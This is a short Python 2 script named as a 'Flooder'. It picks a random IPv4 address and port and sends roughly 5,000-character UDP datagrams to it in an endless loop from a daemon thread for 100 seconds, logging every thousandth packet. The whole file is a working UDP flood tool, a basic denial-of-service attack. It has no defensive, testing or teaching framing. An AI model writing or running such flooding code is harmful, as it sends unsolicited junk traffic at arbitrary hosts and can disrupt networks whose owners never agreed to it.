# -*- coding: utf-8 -*-
# !/usr/bin/python
from socket import *
import time
from time import ctime
import random, thread,threading
import string, sys


class Flooder:
    def __init__(self):
        pass

    def flood(self):
        tid = thread.get_ident()
        print "Thread %d tid is running"%tid
        host = "%d.%d.%d.%d" % (
            random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
        port = random.randint(0, 65535)
        addr = (host, port)
        udp_clisock = socket(AF_INET, SOCK_DGRAM)
        number = 1
        while True:
            number += 1
            data = string.printable * 50  # 构造一个50*100长度的字符串
            udp_clisock.sendto('[%s] %s' % (ctime(), data), addr)
            if number % 1000 == 0:
                print 'sending', number, 'packages to', addr, '...'

        udp_clisock.close()


def main():
    flooder = Flooder()
    threads = [threading.Thread(target=flooder.flood) for _ in range(1)]
    [t.setDaemon(True) for t in threads]
    [t.start() for t in threads]
    time.sleep(100)
    return


if __name__ == '__main__':
    main()
